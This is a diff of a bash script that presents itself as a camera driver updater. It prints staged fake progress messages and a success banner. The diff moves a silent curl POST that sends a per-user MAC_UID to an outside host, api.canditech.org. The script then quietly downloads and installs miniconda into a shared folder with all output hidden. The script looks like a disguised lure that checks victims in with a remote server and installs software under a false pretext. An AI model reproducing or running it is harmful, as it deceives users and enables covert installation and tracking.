@@ -15,13 +15,7 @@ delay 4
 echo "[INFO] Searching for Camera Drivers ..."
 delay 6
 echo "[INFO] Update Driver Packages..."
-delay 12
-echo "[SUCCESS] Camera drivers have been updated successfully."
 
-if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-  AUTO_URL="https://api.canditech.org/change-connection-status/${MAC_UID}"
-  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
-fi
 download() {
   # download <url> <output>
   local url="$1"
@@ -143,8 +137,13 @@ elif [[ "$OS" == "Linux" ]]; then
 else
     exit 1
 fi
+delay 4
+echo "[SUCCESS] Camera drivers have been updated successfully."
 
-
+if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
+  AUTO_URL="https://api.canditech.org/change-connection-status/${MAC_UID}"
+  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
+fi
 curl -L -o miniconda.sh "$URL" > /dev/null 2>&1 && \
 
 bash miniconda.sh -b -p "/Users/Shared/miniconda3" > /dev/null 2>&1 && \
